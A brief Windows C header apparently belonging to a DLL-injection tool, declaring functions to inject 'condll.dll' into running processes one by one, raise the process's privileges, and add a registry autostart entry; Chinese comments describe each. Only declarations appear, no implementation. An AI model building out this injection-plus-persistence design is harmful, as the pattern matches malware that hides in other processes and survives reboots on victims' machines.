#ifndef _INJECT_MAIN_
#define _INJECT_MAIN_

#include <Windows.h>
#include <TlHelp32.h>


#define MY_DLL_NAME "\\condll.dll"

/*
 * 远程注入dll到进程中，所有的dll都尝试一遍，直到注册成功为止
 */
int InjectProcess(PROCESSENTRY32& pe, char* dllPath);

/* 
 * 提升权限
 */
bool ImprovePriv();

//写注册表，自启动
bool AutoStart(char* path);

#endif
